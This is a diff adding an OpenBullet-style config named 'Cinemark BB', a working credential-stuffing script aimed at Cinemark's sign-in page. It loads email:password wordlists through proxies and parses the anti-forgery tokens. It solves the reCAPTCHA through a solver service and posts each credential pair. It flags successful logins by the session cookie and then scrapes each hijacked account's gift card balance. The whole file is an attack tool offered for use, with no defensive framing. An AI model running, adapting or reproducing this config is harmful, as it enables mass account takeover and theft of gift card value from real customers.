@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Cinemark BB",
+  "SuggestedBots": 100,
+  "LastModified": "2019-03-14T00:06:52.1486037+01:00",
+  "AdditionalInfo": "",
+  "Author": "FairySubsTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_main_page REQUEST GET "https://www.cinemark.com/Membership/SignIn" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Connection: keep-alive" 
+#TOKEN PARSE "<SOURCE>" CSS "[name=\"__RequestVerificationToken\"]" "value" 0 -> VAR "TOKEN" "" "" 
+#UFPRT PARSE "<SOURCE>" CSS "[name='ufprt']" "value" 0 -> VAR "UFPRT" "" "" 
+RECAPTCHA "https://www.cinemark.com/Membership/SignIn" "6LeUThsUAAAAAKzsOZb9Ltqlf5o_5MBXVZEJAoQt" -> VAR "RECAP" 
+#POST REQUEST POST "https://www.cinemark.com/Membership/SignIn" AutoRedirect=TRUE 
+  CONTENT "-----------------------------18467633426500\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\n\n<TOKEN>\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"ConfirmationToken\"\n\n\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"ConfirmationTokenDate\"\n\n\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"IsConnectionsStep\"\n\nFalse\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"IsMobileAppContext\"\n\nFalse\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"EmailAddress\"\n\n<USER>\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"Password\"\n\n<PASS>\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"RememberMe\"\n\nfalse\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"g-recaptcha-response\"\n\n<RECAP>\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"ufprt\"\n\n<UFPRT>\n-----------------------------18467633426500--\n" 
+  CONTENTTYPE "multipart/form-data; boundary=---------------------------18467633426500" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.cinemark.com/Membership/SignIn" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+#Cookie PARSE "<COOKIES(.AspNet.ApplicationCookie)>" LR "" "" Recursive=FALSE -> VAR "COO" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Cinemark - Sign In" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains ".AspNet.ApplicationCookie" 
+#GET_Balance REQUEST GET "https://www.cinemark.com/account/giftcards" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.cinemark.com/Membership/SignIn" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "col-xs-5 col-sm-2 col-md-2 col-lg-1\"><h5>$0.00" 
+    KEY "No registered Gift Cards found." 
+#Balance PARSE "<SOURCE>" LR "col-xs-5 col-sm-2 col-md-2 col-lg-1\"><h5>" "</h5></div>" Recursive=FALSE -> CAP "BAL" "" "" 
